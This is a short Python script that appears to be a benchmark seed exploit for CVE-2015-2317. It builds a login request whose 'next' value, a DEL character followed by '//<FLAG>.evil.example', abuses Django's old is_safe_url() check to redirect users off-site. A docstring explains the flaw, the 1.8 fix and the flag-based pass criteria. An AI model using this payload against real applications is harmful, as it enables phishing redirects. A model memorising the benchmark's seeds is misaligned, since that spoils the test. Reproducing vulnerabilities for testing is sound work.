#!/usr/bin/env python3
r"""[GIVEN] CVE-2015-2317 seed exploit -- Django is_safe_url() leading-control-char open redirect.

Real-app-http: this is fired as a real HTTP request `GET /login?next=<v>` (Host: app.local)
against the running Django app; the app's `go` view gates the redirect through Django's OWN
django.utils.http.is_safe_url and returns a real 302.

Django < 1.8 (V0 = 1.7.5) `is_safe_url()` had NO leading-control-character check. A `?next=` value
whose first character is a control character (here DEL, \x7f) is parsed by urlparse as a relative
path (netloc==''), so is_safe_url returns True and the login view redirects to it unconditionally.
Browsers ignore the leading control char and treat the remainder `//<host>` as scheme-relative, so
the redirect lands off-origin on the attacker host. This seed sets

    next = \x7f//<FLAG>.evil.example        (sent URL-encoded as %7F%2F%2F<FLAG>.evil.example)

so a successful open redirect emits `Location: %7F//<FLAG>.evil.example` (Django percent-encodes the
DEL via iri_to_uri) -- the flag host-label surfaces in the Location header. The redirect-host label
is the per-run ${PCB_FLAG}; nothing is planted server-side.

Contract: reaches the flag on V0; BLOCKED on V1 (1.8.0). The CVE-2015-2317 fix adds
`if unicodedata.category(url[0])[0] == 'C': return False`, so the leading DEL char is rejected and
the login view falls back to `Location: /` (no flag). This is the seed the SUT is given.

Note on the chosen control char: CVE-2015-2317's fix rejects ALL leading category-'C' characters.
\x7f (DEL) is category 'Cc' -- squarely inside that fix.
"""
from __future__ import annotations


def candidate(flag: str) -> dict:
    """A GET /login whose ?next= is a leading-control-char scheme-relative attacker URL."""
    return {
        "probe_id": "cve-2015-2317-leading-control-char",
        "method": "GET",
        "path": "/login",
        "next": f"\x7f//{flag}.evil.example",
    }


if __name__ == "__main__":
    # 平台约定：stdout 输出 JSON candidate；flag 以 PCBFLAG_ 占位符形式给出，
    # verify.sh 随后把 PCBFLAG_[A-Za-z0-9_]+ 替换为 per-run RUN_FLAG。
    # （\x7f 经 json.dumps 转义为 \u007f，verify.sh 的 JSON 解析后还原为真实 DEL 控制字节。）
    import json
    import sys
    _ = sys.argv  # original_poc.py <version> — 版本参数仅占位
    print(json.dumps(candidate("PCBFLAG_demo")))
